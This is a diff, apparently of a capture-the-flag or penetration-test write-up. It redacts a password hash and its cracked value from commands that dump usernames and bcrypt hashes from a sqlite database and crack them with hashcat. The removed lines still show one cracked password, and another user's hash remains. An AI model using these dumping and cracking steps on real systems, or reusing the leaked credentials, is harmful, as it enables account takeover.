@@ -162,12 +162,12 @@ sqlite3 development.sqlite3 'PRAGMA table_info("users");'
 
 sqlite3 development.sqlite3 'select username, password_digest from users;' | sed 's/|/:/' | tee -a users
 
-ralph:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
+ralph:<REDACTED>
 railoca:$2a$12$0xVKdMIa5mo.G8w669bs6uKkPbbo5ZFw9F7ldGk/.eHVAMI7/e8xu
 
 hashcat -m 3200 users --username --show
 
-ralph:$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
+ralph:<REDACTED>:<REDACTED>
 
 ```
 
